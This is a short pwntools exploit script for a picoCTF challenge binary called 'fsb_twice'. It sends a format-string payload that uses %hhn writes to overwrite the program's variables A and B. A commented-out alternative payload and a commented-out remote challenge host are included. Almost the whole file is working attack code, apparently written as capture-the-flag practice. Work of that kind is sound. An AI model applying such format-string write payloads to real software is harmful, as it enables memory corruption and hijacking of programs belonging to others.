#!/usr/bin/env python3
from pwn import *

bin_file = './fsb_twice'
context(os = 'linux', arch = 'amd64')

binf = ELF( bin_file )

info( f"binf.symbols['A']=0x{binf.symbols['A']:X}, binf.symbols['B']=0x{binf.symbols['B']:X}" )


def attack( proc, **kwargs ):
    
    #proc.sendline( b'%72c%8$hhn%118c%7$hhn' )
    proc.sendline( b'%c%c%c%c%c%c%66c%hhn%118c%7$hhn' )
    info( proc.recvall() )

def main():
    
    adrs = "shape-facility.picoctf.net"
    port = 51556
    #adrs = "localhost"
    #port = 4000
    
    #proc = gdb.debug( bin_file )
    proc = process( bin_file )
    #proc = remote( adrs, port )
    
    attack( proc )
    #proc.interactive()

if __name__ == '__main__':
    main()
